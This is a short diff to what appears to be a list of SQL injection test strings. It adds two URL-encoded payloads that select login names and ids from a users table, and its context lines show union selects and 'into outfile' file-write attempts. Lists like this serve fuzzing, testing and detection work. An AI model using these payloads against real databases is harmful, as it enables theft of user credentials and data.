@@ -237,3 +237,5 @@ test'-'xyz' union (select table)
 '1' into outfile (substring('asd', 10, 1))
 @version into outfile (substring('asd', 10 1))
 
+%28select+substr%0D%0A%28login%0D%0A%0D%0A%29%0D%0Afrom+users+limit+1%2C1%29
+union%20%28select+id+from+users+limit+1%2C1%29
